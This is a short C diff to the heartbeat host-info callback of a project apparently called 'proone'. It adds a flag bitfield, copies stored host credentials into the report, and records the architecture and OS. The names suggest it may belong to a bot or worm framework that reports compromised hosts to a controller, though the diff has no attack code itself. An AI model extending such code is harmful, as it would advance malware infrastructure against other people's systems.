@@ -15,6 +15,7 @@
 #include "htbt.h"
 #include "config.h"
 #include "mbedtls.h"
+#include "bitfield.h"
 #include "proone_conf/x509.h"
 
 #include <mbedtls/entropy.h>
@@ -101,15 +102,22 @@ static bool cb_hostinfo (void *ctx, prne_htbt_host_info_t *out) {
 		"FIXME");
 	memcpy(out->instance_id, instance_id, sizeof(instance_id));
 
-	if (prne_htbt_alloc_host_info(out, hostcred_len)) {
+	if (prne_htbt_alloc_host_info(
+			out,
+			hostcred_len,
+			prne_bf_get_size(NB_PRNE_IFLAG)))
+	{
 		memcpy(out->host_cred, hostcred, hostcred_len);
+		prne_bf_set(out->bf, PRNE_IFLAG_WKR_HTBT, true);
+		// TODO: set PRNE_FLAG_BA
 	}
 	else {
 		return false;
 	}
 
 	out->crash_cnt = 0;
-	out->arch = prne_host_arch;
+	out->arch = PRNE_HOST_ARCH;
+	out->os = PRNE_HOST_OS;
 
 	return true;
 }
